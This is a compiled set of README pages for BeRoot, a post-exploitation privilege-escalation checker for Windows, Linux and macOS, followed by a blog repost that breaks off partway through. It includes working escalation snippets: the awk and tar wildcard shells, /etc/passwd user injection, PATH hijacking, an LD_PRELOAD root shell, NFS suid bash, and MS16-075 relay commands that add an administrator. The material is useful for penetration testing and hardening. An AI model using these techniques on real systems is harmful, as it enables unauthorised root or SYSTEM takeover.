# BeRoot Project

[](https://github.com/AlessandroZ/BeRoot#beroot-project)

BeRoot Project is a post exploitation tool to check common misconfigurations to find a way to escalate our privilege.  
It has been added to the [pupy](https://github.com/n1nj4sec/pupy/) project as a post exploitation module (so it will be executed in memory without touching the disk).

This tool does not realize any exploitation. It mains goal is not to realize a configuration assessment of the host (listing all services, all processes, all network connection, etc.) but to print only information that have been found as potential way to escalate our privilege.

This project works on Windows, Linux and Mac OS. You could find the Windows version [here](https://github.com/AlessandroZ/BeRoot/tree/master/Windows) and the Linux and Mac OS [here](https://github.com/AlessandroZ/BeRoot/tree/master/Linux)

I recommend reading the README depending on the targeted OS, to better understand what's happening.

I tried to implement most techniques described in this picture:

[![BeRoot](https://user-images.githubusercontent.com/10668373/43284508-4f242070-911c-11e8-9b05-e0e9261ed3cb.jpeg)](https://user-images.githubusercontent.com/10668373/43284508-4f242070-911c-11e8-9b05-e0e9261ed3cb.jpeg)

Enjoy ;)

## Interesting projects

[](https://github.com/AlessandroZ/BeRoot#interesting-projects)

- [Windows / Linux Local Privilege Escalation Workshop](https://github.com/sagishahar/lpeworkshop)

**Credit:** This information was adapted from an excellent guide on [GitHub](https://github.com/AlessandroZ/BeRoot). Be sure to check out the original post for more details.

# BeRoot For Windows

[](https://github.com/AlessandroZ/BeRoot/tree/master/Windows#beroot-for-windows)

BeRoot(s) is a post exploitation tool to check common Windows misconfigurations to find a way to escalate our privilege.  
A compiled version is available [here](https://github.com/AlessandroZ/BeRoot/releases).

It has been added to the [pupy](https://github.com/n1nj4sec/pupy/) project as a post exploitation module (it's executed in memory without touching the disk).

This tool is only used to detect and not to exploit. If something is found, [templates](https://github.com/AlessandroZ/BeRoot/tree/master/Windows/templates) could be used to exploit it. To use it, just create a **test.bat** file located next to the service / DLL used. It should execute it once called. Depending on the Redistributable Packages installed on the target host, these binaries may not work.

## Run it

[](https://github.com/AlessandroZ/BeRoot/tree/master/Windows#run-it)

```
|====================================================================|
|                                                                    |
|                    Windows Privilege Escalation                    |
|                                                                    |
|                          ! BANG BANG !                             |
|                                                                    |
|====================================================================|


usage: beRoot.exe [-h] [-l]

Windows Privilege Escalation

optional arguments:
  -h, --help         show this help message and exit
  -l, --list         list all softwares installed (not run by default)
```

All detection methods are described on the following document.

## Path containing space without quotes

[](https://github.com/AlessandroZ/BeRoot/tree/master/Windows#path-containing-space-without-quotes)

Consider the following file path:

```
C:\Program Files\Some Test\binary.exe
```

If the path contains spaces and no quotes, Windows would try to locate and execute programs in the following order:

```
C:\Program.exe
C:\Program Files\Some.exe
C:\Program Files\Some Folder\binary.exe
```

Following this example, if "_C:\_" folder is writable, it would be possible to create a malicious executable binary called "_Program.exe_". If "_binary.exe_" run with high privilege, it could be a good way to escalate our privilege.

Note: BeRoot realized these checks on every service path, scheduled tasks and startup keys located in HKLM.

**How to exploit**:  
  
The vulnerable path runs as:

- _a service_: create a malicious service (or compile the service template)
- _a classic executable_: Create your own executable.

## Writable directory

[](https://github.com/AlessandroZ/BeRoot/tree/master/Windows#writable-directory)

Consider the following file path:

```
C:\Program Files\Some Test\binary.exe
```

If the root directory of "_binary.exe_" is writable (_"C:\Program Files\Some Test"_) and run with high privilege, it could be used to elevate our privileges.

**Note**: BeRoot realized these checks on every service path, scheduled tasks and startup keys located in HKLM.

**How to exploit**:

- The service is not running:
    
    - Replace the legitimate service by our own, restart it or check how it's triggered (at reboot, when another process is started, etc.).
- The service is running and could not be stopped:
    
    - Most exploitation will be like that, checks for dll hijacking and try to restart the service using previous techniques.

## Writable directory on %PATH%

[](https://github.com/AlessandroZ/BeRoot/tree/master/Windows#writable-directory-on-path)

This technique affects the following Windows version:

```
6.0 	=> 	Windows Vista / Windows Server 2008
6.1 	=> 	Windows 7 / Windows Server 2008 R2
6.2 	=> 	Windows 8 / Windows Server 2012
```

On a classic Windows installation, when DLLs are loaded by a binary, Windows would try to locate it using these following steps:

```
- Directory where the binary is located
- C:\Windows\System32
- C:\Windows\System
- C:\Windows\
- Current directory where the binary has been launched
- Directory present in %PATH% environment variable
```

If a directory on the **%PATH%** variable is writable, it would be possible to realize DLL hijacking attacks. Then, the goal would be to find a service which loads a DLL not present on each of these path. This is the case of the default "**IKEEXT**" service which loads the non existent "**wlbsctrl.dll**".

**How to exploit**: Create a malicious DLL called "_wlbsctrl.dll_" (use the [DLL template](https://github.com/AlessandroZ/BeRoot/tree/master/templates/DLL_Hijacking)) and add it to the writable path listed on the %PATH% variable. Start the service "_IKEEXT_". To start the IKEEXT service without high privilege, a technique describe on the french magazine MISC 90 explains the following method:

Create a file as following:

```
C:\Users\bob\Desktop>type test.txt
[IKEEXTPOC]
MEDIA=rastapi
Port=VPN2-0
Device=Wan Miniport (IKEv2)
DEVICE=vpn
PhoneNumber=127.0.0.1
```

Use the "_rasdial_" binary to start the IKEEXT service. Even if the connection failed, the service should have been started.

```
C:\Users\bob\Desktop>rasdial IKEEXTPOC test test /PHONEBOOK:test.txt
```

Or you can try using these tools:

- [Ikeext-Privesc](https://github.com/itm4n/Ikeext-Privesc) powershell script
- [Wlbsctrl_poc](https://github.com/djhohnstein/wlbsctrl_poc) in C++

## AlwaysInstallElevated registry key

[](https://github.com/AlessandroZ/BeRoot/tree/master/Windows#alwaysinstallelevated-registry-key)

**AlwaysInstallElevated** is a setting that allows non-privileged users the ability to run Microsoft Windows Installer Package Files (_MSI_) with elevated (_SYSTEM_) permissions. To allow it, two registry entries have to be set to **1**:

```
HKEY_CURRENT_USER\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated
HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated
```

**How to exploit**: create a malicious msi binary and execute it.

## Unattended Install files

[](https://github.com/AlessandroZ/BeRoot/tree/master/Windows#unattended-install-files)

This file contains all the configuration settings that were set during the installation process, some of which can include the configuration of local accounts including Administrator accounts. These files are available on these following path:

```
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattended.xml
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\System32\Sysprep\unattend.xml 
C:\Windows\System32\Sysprep\Panther\unattend.xml
```

**How to exploit**: open the unattend.xml file to check if passwords are present on it. Should looks like:

```
<UserAccounts>
    <LocalAccounts>
        <LocalAccount>
            <Password>
                <Value>RmFrZVBhc3N3MHJk</Value>
                <PlainText>false</PlainText>
            </Password>
            <Description>Local Administrator</Description>
            <DisplayName>Administrator</DisplayName>
            <Group>Administrators</Group>
            <Name>Administrator</Name>
        </LocalAccount>
    </LocalAccounts>
</UserAccounts>
```

## Services

[](https://github.com/AlessandroZ/BeRoot/tree/master/Windows#services)

Checks if it's possible to:

- Modify an existing service
- Create a new service

_Note: Checks on path are performed on all services ("Path containing space without quotes" and "Writable directory")_

## Tasks Scheduler

[](https://github.com/AlessandroZ/BeRoot/tree/master/Windows#tasks-scheduler)

Check if it's possible to modify the directory where all scheduled tasks are stored: "_C:\Windows\system32\Tasks_"

_Note: Checks on path are performed on all scheduled tasks ("Path containing space without quotes" and "Writable directory")_

## Startup Key

[](https://github.com/AlessandroZ/BeRoot/tree/master/Windows#startup-key)

Check if it's possible to modify a startup key (on HKLM)

_Note: Checks on path are performed on all startup keys ("Path containing space without quotes" and "Writable directory")_

## Windows Privileges & Tokens

[](https://github.com/AlessandroZ/BeRoot/tree/master/Windows#windows-privileges--tokens)

Thanks to **Andrea Pierini**'s work, some interesting Windows privileges could be used to escalate privileges. These privileges are:

- SeDebug
- SeRestore & SeBackup & SeTakeOwnership
- SeTcb & SeCreateToken
- SeLoadDriver
- SeImpersonate & SeAssignPrimaryToken

Beroot lists all privileges we have and highlight if we have one of these tokens.

**How to exploit**: Everything is well explained on **Andrea Pierini**'s [pdf](https://github.com/AlessandroZ/BeRoot/blob/master/Windows/templates/RomHack%202018%20-%20Andrea%20Pierini%20-%20whoami%20priv%20-%20show%20me%20your%20Windows%20privileges%20and%20I%20will%20lead%20you%20to%20SYSTEM.pdf).

## Local account with empty password

[](https://github.com/AlessandroZ/BeRoot/tree/master/Windows#local-account-with-empty-password)

All local accounts are tested to detect empty password.

## Local account with passwordreq:no

[](https://github.com/AlessandroZ/BeRoot/tree/master/Windows#local-account-with-passwordreqno)

Idea comes from 0xRick 's [write up](https://0xrick.github.io/hack-the-box/access/).

Checking for user account options, we could see this kind of output:

```
> net user username
....
Password Required   No
...
```

This means than the option `/passwordreq:no` has been set

```
> net user /passwordreq:no username
```

This directive allows us to use `runas` without needed the user account password.

```
> runas /user:username /savecred cmd.exe
```

Check 0xRick blog post to have a better example.

## Not managed by Beroot

[](https://github.com/AlessandroZ/BeRoot/tree/master/Windows#not-managed-by-beroot)

Some misconfigurations that could lead to privilege escalation are not checked by Beroot. These actions need monitoring and should be done manually:

- When a privilege account access a non privilege file: [http://offsec.provadys.com/intro-to-file-operation-abuse-on-Windows.html](http://offsec.provadys.com/intro-to-file-operation-abuse-on-Windows.html)
- Dll Hijacking
- Outdated Windows (use [Watson](https://github.com/rasta-mouse/Watson) or [wesng](https://github.com/bitsadmin/wesng) and check on [github](https://github.com/SecWiki/windows-kernel-exploits) for exploits).
- From Local/Network service account to admin. Check itm4n's [write up](https://itm4n.github.io/localservice-privileges/) and his [tool](https://github.com/itm4n/FullPowers)

## Special thanks

[](https://github.com/AlessandroZ/BeRoot/tree/master/Windows#special-thanks)

- Good description of each checks: [https://toshellandback.com/2015/11/24/ms-priv-esc/](https://toshellandback.com/2015/11/24/ms-priv-esc/)
- Andrea Pierini [work](https://2018.romhack.io/slides/RomHack%202018%20-%20Andrea%20Pierini%20-%20whoami%20priv%20-%20show%20me%20your%20Windows%20privileges%20and%20I%20will%20lead%20you%20to%20SYSTEM.pdf)

**Credit:** This information was adapted from an excellent guide on [GitHub](https://github.com/AlessandroZ/BeRoot/tree/master/Windows). Be sure to check out the original post for more details.

# BeRoot For Linux

[](https://github.com/AlessandroZ/BeRoot/tree/master/Linux#beroot-for-linux)

BeRoot is a post exploitation tool to check common misconfigurations on Linux and Mac OS to find a way to escalate our privilege.

I recommend reading all the README to understand all checks performed by Beroot.  
If you have the user password, specify it as argument, you could get more results.

```
python beroot.py --password super_strong_password
```

## GTFOBins

[](https://github.com/AlessandroZ/BeRoot/tree/master/Linux#gtfobins)

[GTFOBins](https://gtfobins.github.io/#) could be used to gain root privilege on a system. These binaries allow a user to execute arbitrary code on the host, so imagine you could have access to one of them with sudo privilege (suid binary or if it's allowed on the sudoers file), you should be able to execute system command as root. BeRoot contains a list of theses binaries taken from [GTFOBins](https://gtfobins.github.io/#).

Here is an example of a well-known binary:

- awk

```
sudo awk 'BEGIN {system("/bin/sh")}'
```

**Note**: If you have more binary examples, do not hesitate to open an issue explaining the technique and I will add it in the list.

Having sudo access on these binaries do not mean you could always manage to execute commands on the system. For example, using the **mount** binary with a limited user could give you the following well known error, if it's well configured:

```
mount: only root can use "--options" option
```

## Wildcards

[](https://github.com/AlessandroZ/BeRoot/tree/master/Linux#wildcards)

If you have never heard about Unix wildcards, I suggest you read this very well explained [article](https://www.defensecode.com/public/DefenseCode_Unix_WildCards_Gone_Wild.txt). Using wildcards could lead into code execution if this one is not well called.

For our example, we want to get a shell ("sh") using the **tar** command to execute code on the server. As explained on the GTFOBins section, we could get it doing:

```
tar cf archive.tar * --checkpoint=1 --checkpoint-action=exec=sh
```

We consider a test file which is used to realize an archive of all files present on the directory.

```
user@host:~$ cat test.sh 
tar cf archive.tar * 
```

Here are the steps to exploit this bad configuration:

- open nano (with no arguments)
- write something in it
- save file using **tar** arguments as file names:
    - --checkpoint-action=exec=sh
    - --checkpoint=1

Once created, this is what you will find:

```
user@host:~$ ls -la 
total 32
-rw-r--r-- 1 user user     5 Jan 12 10:34 --checkpoint-action=exec=sh
-rw-r--r-- 1 user user     3 Jan 12 10:33 --checkpoint=1
drwxr-xr-x 2 user user  4096 Jan 12 10:34 .
drwxr-xr-x 7 user user  4096 Jan 12 10:29 ..
-rwxr-xr-x 1 user user    22 Jan 12 10:32 test.sh
```

If this file is executed as root (from cron table, from sudoers, etc.), you should gain root access on the system.

```
user@host:~$ sudo ./test.sh 
sh-4.3# id
uid=0(root) gid=0(root) groups=0(root)
```

So depending on which binary and how the wildcard are used, the exploitation can be done or not. So on our example, the exploitation would not work anymore if the file would be like this:

```
user@host:~$ cat test.sh 
tar cf archive.tar *.txt
```

Thus, using a tool to detect these misconfigurations is very difficult. A manual analysis should be done to check if it's a false positive or not.

## Sensitive files

[](https://github.com/AlessandroZ/BeRoot/tree/master/Linux#sensitive-files)

Lots of file are run with high permissions on the system (e.g cron files, services, etc.). Here is an example of interesting directories and files:

```
/etc/init.d
/etc/cron.d 
/etc/cron.daily
/etc/cron.hourly
/etc/cron.monthly
/etc/cron.weekly
/etc/sudoers
/etc/exports
/etc/passwd
/etc/shadow
/etc/at.allow
/etc/at.deny
/etc/crontab
/etc/cron.allow
/etc/cron.deny
/etc/anacrontab
/var/spool/cron/crontabs/root
/usr/lib
/lib
/etc/ld.so.conf
```

For example, if we have write permission on `/etc/passwd` we could get root. Tips from [here](https://twitter.com/nemesis09/status/1136263868177616896)

```
echo zapata::0:0:New user:/root:/bin/bash >> /etc/passwd
su zapata
```

[Here](https://www.boiteaklou.fr/Abusing-Shared-Libraries.html) are another example if a writable file is found on `/etc/ld.so.conf` which could lead to hijack dlls.

Here are the tests done by BeRoot:

- checks if you have access with write permission on these files.
- checks inside the file, to find other paths with write permissions.
- if files are executables or scripts, root directory are checked to detect if we have write access on it (useful for library hijacking, etc.)/

## Services

[](https://github.com/AlessandroZ/BeRoot/tree/master/Linux#services)

Services are listed using dbus. If `python-dbus` is not present on the remote host, no services are checked (except those found on /etc/init.d/). However, you should not have this error using [Pupy](https://github.com/n1nj4sec/pupy/) because this lib is remotely loaded on the remote system.

Binpath and root directories are checked to see if there are write access.

## Suid binaries

[](https://github.com/AlessandroZ/BeRoot/tree/master/Linux#suid-binaries)

SUID (Set owner User ID up on execution) is a special type of file permissions given to a file. SUID is defined as giving temporary permissions to a user to run a program/file with the permissions of the file owner rather that the user who runs it. So if suid file is owned by root, you should execute it using root privilege.

BeRoot prints all suid files because a manual analysis should be done on each binary. However, it realizes some actions:

- checks if we have write permissions on these binary (why not ? :))
- checks if a GTFOBins is used as suid to be able to execute system commands using it (remember you could have suid GTFOBins without being able to execute commands - checks GTFOBins section with the false positive example using **mount**).
- checks if system function (from libc) is used. If so, try to check if a bin is called without using an absolute path (some false positive could occurs in this check). For more information check the PATH environment variable section.
- checks if an exec function (from libc) is used. If so, try to find a file with writable access.

To analyse manually, checking for .so files loaded from a writable path should be a great idea (this check has not been implemented on BeRoot):

```
strace [SUID_PATH] 2>&1 | grep -i -E "open|access|no such file"
```

## Path Environment variable

[](https://github.com/AlessandroZ/BeRoot/tree/master/Linux#path-environment-variable)

system will call the shell (sh) to execute the command sent as an argument.

For example, if a C program calls the system function like so:

```
#include<unistd.h>
void main()
{
	setuid(0);
	setgid(0);
	system("whoami");
}
```

The binary whoami can be hijacked with the PATH environment variable like so:

```
cd /tmp
echo "cat /etc/shadow" > whoami
chmod 777 whoami
export PATH=/tmp:$PATH
```

For more information, checks these two examples [here](https://0xrick.github.io/hack-the-box/zipper/#privilege-escalation-and-getting-root) and [here](https://www.hackingarticles.in/linux-privilege-escalation-using-path-variable/).

To detect it, on each suid binary, we try to find the system call using objdump.

```
objdump -T suid_bin | grep " system"
```

If it exists, we realise a `strings` on this binary, and try to found a string which does not use an absolute path and that it exists as a built in binary (/bin, /usr/bin, /sbin, etc.). Some false positive can occur, so a manual check should be done.

This cannot be done if exec functions are used (execve|execl|execlp|execle|execv|execvp|execvpe) because the file should be run from an absolute path.

## NFS Root Squashing

[](https://github.com/AlessandroZ/BeRoot/tree/master/Linux#nfs-root-squashing)

If **no_root_squash** appears in `/etc/exports`, privilege escalation may be done. More information can be found [here](https://haiderm.com/linux-privilege-escalation-using-weak-nfs-permissions/).

Exploitation:

```
mkdir /tmp/nfsdir  # create dir
mount -t nfs 192.168.1.10:/shared /tmp/nfsdir # mount directory 
cd /tmp/nfsdir
cp /bin/bash . 	# copy wanted shell 
chmod +s bash 	# set suid permission
```

## LD_PRELOAD

[](https://github.com/AlessandroZ/BeRoot/tree/master/Linux#ld_preload)

If **LD_PRELOAD** is explicitly defined on sudoers file, it could be used to elevate our privilege. \

For example:

```
Defaults        env_keep += LD_PRELOAD
```

Create a share object:

```
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
void _init() {
	unsetenv("LD_PRELOAD");
	setgid(0);
	setuid(0);
	system("/bin/sh");
}
```

Compile it:

```
gcc -fPIC -shared -o shell.so shell.c -nostartfiles
```

If you have a binary that you could launch with sudo and NOPASSWD, launch it with LD_PRELOAD pointing to your shared object:

```
sudo LD_PRELOAD=/tmp/shell.so find
```

More information can be found [here](http://www.hackingarticles.in/linux-privilege-escalation-using-ld_preload/).

## Sudoers file

[](https://github.com/AlessandroZ/BeRoot/tree/master/Linux#sudoers-file)

Most of privilege escalations on Linux servers are done using bad sudo configurations. This configuration can be seen in **/etc/sudoers** file.  
To better understand the BeRoot workflow, you should have an idea on how a sudoers line is composed.

Basic line pattern:

```
users  hosts = (run-as) tags: commands
```

Here is an example using aliases.

```
User_Alias ADMINS = admin, user, root
Cmnd_Alias ADMIN_CMDS = /sbin/service, /usr/sbin/iptables, python /tmp/file.py
ADMINS ALL = (ALL) NOPASSWD: ADMIN_CMDS
```

So users "admin", "user" and "root" could execute "service", "iptables" and "file.py" without password needed (thanks to NOPASSWD):

```
admin,user,root ALL = (ALL) NOPASSWD: /sbin/service, /usr/sbin/iptables, python /tmp/file.py
```

So BeRoot will analyse all rules:

- if it affects our user or our user's group:
    - check if we have write permissions on all possible commands (in our example, it will test "service", "iptables", "python" and "/tmp/files.py")
    - check for GTFOBins
    - check if we can impersonate another user ("su" command)
        - realize again all these checks on the sudoers file using this new user

## Sudo list

[](https://github.com/AlessandroZ/BeRoot/tree/master/Linux#sudo-list)

Sometimes you do not have access to /etc/sudoers.

```
$ cat /etc/sudoers
cat: /etc/sudoers: Permission denied
```

However, listing sudo rules is possible using sudo -l

```
$ sudo -l  
Matching Defaults entries for test on XXXXX:
    env_reset, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User test may run the following commands on XXXXX:
    (ALL) /bin/bash
```

Why is it possible ? On the [documentation](https://www.sudo.ws/man/1.8.17/sudoers.man.html) it's written: `By default, if the NOPASSWD tag is applied to any of the entries for a user on the current host, he or she will be able to run "sudo -l" without a password. [...] This behavior may be overridden via the verifypw and listpw options`

However, these rules only affect the current user, so if user impersonation is possible (using su) `sudo -l` should be launched from this user as well.  
BeRoot collects all these rules from all possible users and run exactly the same tests as listed previously (e.g sudoers file method).

Be careful ! If the user does not have the directive `NOPASSWD` in one of his rules, we cannot list sudo rules without his user password.

```
$ sudo -l 
Password: 
```

In this case, specify the user password to Beroot.

```
python beroot.py --password super_strong_password
```

## Python Library Hijacking

[](https://github.com/AlessandroZ/BeRoot/tree/master/Linux#python-library-hijacking)

If any of these search paths are world writable, it will impose a risk of privilege escalation, as placing a file in one of these directories with a name that matches the requested library will load that file, assuming it's the first occurrence.

```
Directory of the script being executed
/usr/lib/python2.7
/usr/lib/python2.7/plat-x86_64-linux-gnu
/usr/lib/python2.7/lib-tk
/usr/lib/python2.7/lib-old
/usr/lib/python2.7/lib-dynload
/usr/local/lib/python2.7/dist-packages
/usr/lib/python2.7/dist-packages
```

These path could be found running:

```
python -c 'import sys; print "\n".join(sys.path)'
```

More information can be found [here](https://rastating.github.io/privilege-escalation-via-python-library-hijacking/).

## Capabilities

[](https://github.com/AlessandroZ/BeRoot/tree/master/Linux#capabilities)

On some system, instead of adding suid right on a binary, administrator add capabilities on it.

If `/sbin/getcap` is present on the filesystem, capabilities on all binaries located on `/usr/bin/` or `/usr/sbin/` are listed. Depending on the capability assigned, some privilege actions could be done.

This idea comes from 0xrick's [write up](https://0xrick.github.io/hack-the-box/waldo/).

Here are more [examples](https://book.hacktricks.xyz/linux-unix/privilege-escalation/linux-capabilities).

## Mounted docker socket

[](https://github.com/AlessandroZ/BeRoot/tree/master/Linux#mounted-docker-socket)

If the **docker socket is mounted** inside the docker container, you will be able to escape from it. Search the socket, usually on `/run/docker.sock` or `/var/run/docker.sock`. If one exists, take a look at [this](https://book.hacktricks.xyz/linux-unix/privilege-escalation/docker-breakout).

If the socket is writable, you could use [traitor](https://github.com/liamg/traitor).

## Container privilege

[](https://github.com/AlessandroZ/BeRoot/tree/master/Linux#container-privilege)

//Not implemented, should be check manually.//

If you are inside a container launched with too much privileges, check what you can do. Interesting container privileges: - privileged - hostpid - hostnetwork - hostipc - hostpath

Take a look on these examples: * [https://labs.bishopfox.com/tech-blog/bad-pods-kubernetes-pod-privilege-escalation](https://labs.bishopfox.com/tech-blog/bad-pods-kubernetes-pod-privilege-escalation) * [https://github.com/BishopFox/badPods](https://github.com/BishopFox/badPods)

## Ptrace Scope

[](https://github.com/AlessandroZ/BeRoot/tree/master/Linux#ptrace-scope)

If ptrace is fully enabled (e.g. `/proc/sys/kernel/yama/ptrace_scope == 0`), it will be possible to read processes memory. If it's enabled, check [sudo_inject](https://github.com/nongiach/sudo_inject) project or inject some processes using libs like [memorpy](https://github.com/n1nj4sec/memorpy/).

From the [documentation](https://www.kernel.org/doc/html/v4.14/admin-guide/LSM/Yama.html), the value of ptrace_scope represent:

```
0 - classic ptrace permissions: a process can PTRACE_ATTACH to any other process running under the same uid, as long as it is dumpable (i.e. did not transition uids, start privileged, or have called prctl(PR_SET_DUMPABLE...) already). Similarly, PTRACE_TRACEME is unchanged.

1 - restricted ptrace: a process must have a predefined relationship with the inferior it wants to call PTRACE_ATTACH on. By default, this relationship is that of only its descendants when the above classic criteria is also met. To change the relationship, an inferior can call prctl(PR_SET_PTRACER, debugger, ...) to declare an allowed debugger PID to call PTRACE_ATTACH on the inferior. Using PTRACE_TRACEME is unchanged.

2 - admin-only attach: only processes with CAP_SYS_PTRACE may use ptrace with PTRACE_ATTACH, or through children calling PTRACE_TRACEME.

3 - no attach: no processes may use ptrace with PTRACE_ATTACH nor via PTRACE_TRACEME. Once set, this sysctl value cannot be changed.
```

## Exploit

[](https://github.com/AlessandroZ/BeRoot/tree/master/Linux#exploit)

Because lots of server are vulnerable to well known exploit (dirtycow, etc.), I have embedded [linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester) to give an overview of potential CVE that affect the kernel (this module will only work for Linux systems).

## Monitoring

[](https://github.com/AlessandroZ/BeRoot/tree/master/Linux#monitoring)

Monitoring could be useful to detect what's running on the system. Beroot does not that but it's possible to list some processes from other users, cron jobs, etc without needing root privileges. This could be done using [pspy](https://github.com/DominicBreuker/pspy).

## Interesting write up

[](https://github.com/AlessandroZ/BeRoot/tree/master/Linux#interesting-write-up)

- 0xRick [blog](https://0xrick.github.io/categories/)
- Raj Chandel's [blog](https://github.com/Ignitetechnologies/Privilege-Escalation)

**Credit:** This information was adapted from an excellent guide on [GitHub](https://github.com/AlessandroZ/BeRoot/tree/master/Linux). Be sure to check out the original post for more details.

# BeRoot- A Post Exploitation Tool To Check Common Misconfigurations For Windows Linux And Mac OS


[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEi0XbyNQbDx0MVgX0N_Gc-N9dTsJl_B0cu-ngxVxGbjFTBIS2R9UXGSaNzRk13xnB4MwLhOE-ruRt22LNrHj1XKxPvsQGuPs8rgyZkbNX6sfn_ozCf3eWSHeQXXT-QuINzT-U6KLgf_EkFN/s1600/Windows+and+Linux+post+Exploitation.png)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEi0XbyNQbDx0MVgX0N_Gc-N9dTsJl_B0cu-ngxVxGbjFTBIS2R9UXGSaNzRk13xnB4MwLhOE-ruRt22LNrHj1XKxPvsQGuPs8rgyZkbNX6sfn_ozCf3eWSHeQXXT-QuINzT-U6KLgf_EkFN/s1600/Windows+and+Linux+post+Exploitation.png)

###   

### BeRoot- A Post Exploitation Tool To Check Common Misconfigurations For Windows Linux And Mac OS 

A compiled version is available [here](https://github.com/AlessandroZ/BeRoot/releases).  
  
It will be added to the [pupy](https://github.com/n1nj4sec/pupy/) project as a post exploitation module (so it will be executed in memory without touching the disk).  
  
Except one method, this tool is only used to detect and not to exploit. If something is found, templates could be used to exploit it. To use it, just create a test.bat file located next to the service / DLL used. It should execute it once called. Depending on the Redistributable Packages installed on the target host, these binaries may not work.  

####   
Check the Following:

- BeRoot For Windows 
- BeRoot For Linux

  

### BeRoot For Windows To Check Common Windows Misconfigurations

#### Run it

|===================================================  
|                                                                    |  
|                    Windows Privilege Escalation                    |  
|                                                                    |  
|                          ! BANG BANG !                             |  
|                                                                    |  
|===================================================  
  
**usage:** beRoot.exe [-h] [-l] [-w] [-c CMD]  
  
**Windows Privilege Escalation**  
  
**optional arguments:**  
  -h, --help         show this help message and exit  
  -l, --list         list all softwares installed (not run by default)  
  -w, --write        write output  
  -c CMD, --cmd CMD  cmd to execute for the webclient check (default: whoami)  
  
All detection methods are described on the following document.  
  

### Path containing space without quotes

#### Consider the following file path:

C:\Program Files\Some Test\binary.exe  
  
If the path contains spaces and no quotes, Windows would try to locate and execute programs in the following order:  

- C:\Program.exe
- C:\Program Files\Some.exe
- C:\Program Files\Some Folder\binary.exe

  
Following this example, if "C:\" folder is writable, it would be possible to create a malicious executable binary called "Program.exe". If "binary.exe" run with high privilege, it could be a good way to escalate our privilege.  
  
_Note: BeRoot realized these checks on every service path, scheduled tasks and startup keys located in HKLM._  

#### How to exploit: 

#### The vulnerable path runs as:

- a service: create a malicious service (or compile the service template)
- a classic executable: Create your own executable.

  

### Writable directory

#### Consider the following file path:

C:\Program Files\Some Test\binary.exe  
  
If the root directory of "binary.exe" is writable ("C:\Program Files\Some Test") and run with high privilege, it could be used to elevate our privileges.  
  
_**Note:** BeRoot realized these checks on every service path, scheduled tasks and startup keys located in HKLM._  

#### How to exploit:

#### 

- The service is not running:

Replace the legitimate service by our own, restart it or check how it's triggered (at reboot, when another process is started, etc.).  

#### 

- The service is running and could not be stopped:

Most exploitation will be like that, checks for dll hijacking and try to restart the service using previous technics.  

### Writable directory on %PATH%

#### This technic affects the following Windows version:

- 6.0  =>  Windows Vista / Windows Server 2008
- 6.1  =>  Windows 7 / Windows Server 2008 R2
- 6.2  =>  Windows 8 / Windows Server 2012

  
On a classic Windows installation, when DLLs are loaded by a binary, Windows would try to locate it using these following steps:  
  
- Directory where the binary is located  
- C:\Windows\System32  
- C:\Windows\System  
- C:\Windows\  
- Current directory where the binary has been launched  
- Directory present in %PATH% environment variable  
  
If a directory on the %PATH% variable is writable, it would be possible to realize DLL hijacking attacks. Then, the goal would be to find a service which loads a DLL not present on each of these path. This is the case of the default "IKEEXT" service which loads the inexistant "wlbsctrl.dll".  
  

#### How to exploit: 

Create a malicious DLL called "wlbsctrl.dll" (use the [DLL template](https://github.com/AlessandroZ/BeRoot/tree/master/templates/DLL_Hijacking)) and add it to the writable path listed on the %PATH% variable. Start the service "IKEEXT". To start the IKEEXT service without high privilege, a technic describe on the french magazine MISC 90 explains the following method:  

#### Create a file as following:

C:\Users\bob\Desktop>type test.txt  
[IKEEXTPOC]  
MEDIA=rastapi  
Port=VPN2-0  
Device=Wan Miniport (IKEv2)  
DEVICE=vpn  
PhoneNumber=127.0.0.1  
  
Use the "rasdial" binary to start the "IKEEXT" service. Even if the connection failed, the service should have been started.  
  
C:\Users\bob\Desktop>rasdial IKEEXTPOC test test /PHONEBOOK:test.txt  
  
Or you can try using the Ikeext-Privesc powershell script.  
  

### MS16-075

For French user, I recommend the article written on the MISC 90 which explain in details how it works.  
  
This vulnerability has been corrected by Microsoft with MS16-075, however many servers are still vulnerable to this kind of attack. I have been inspired from the C++ POC available here  

#### Here are some explaination (not in details):

1. Start Webclient service (used to connect to some shares) using some magic tricks (using its UUID)
2. Start an HTTP server locally
3. Find a service which will be used to trigger a SYSTEM NTLM hash.
4. Enable file tracing on this service modifying its registry key to point to our webserver (\\127.0.0.1@port\tracing)
5. Start this service
6. Our HTTP Server start a negotiation to get the SYSTEM NTLM hash
7. Use of this hash with SMB to execute our custom payload (SMBrelayx has been modify to realize this action)
8. Clean everything (stop the service, clean the regritry, etc.).

#### How to exploit: 

BeRoot realize this exploitation, change the "-c" option to execute custom command on the vulnerable host.  
  
beRoot.exe -c "net user Zapata LaLuchaSigue /add"  
beRoot.exe -c "net localgroup Administrators Zapata /add"  

### AlwaysInstallElevated registry key

AlwaysInstallElevated is a setting that allows non-privileged users the ability to run Microsoft Windows Installer Package Files (MSI) with elevated (SYSTEM) permissions. To allow it, two registry entries have to be set to 1:  
  

- HKEY_CURRENT_USER\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated
- HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated

#### How to exploit: 

create a malicious msi binary and execute it.  
  

### Unattended Install files

This file contains all the configuration settings that were set during the installation process, some of which can include the configuration of local accounts including Administrator accounts. These files are available on these following path:  
  
C:\Windows\Panther\Unattend.xml  
C:\Windows\Panther\Unattended.xml  
C:\Windows\Panther\Unattend\Unattended.xml  
C:\Windows\Panther\Unattend\Unattend.xml  
C:\Windows\System32\Sysprep\unattend.xml   
C:\Windows\System32\Sysprep\Panther\unattend.xml  
  
  

#### How to exploit: 

Open the unattend.xml file to check if passwords are present on it. Should looks like:  
  
<UserAccounts>  
    <LocalAccounts>  
        <LocalAccount>  
            <Password>  
                <Value>RmFrZVBhc3N3MHJk</Value>  
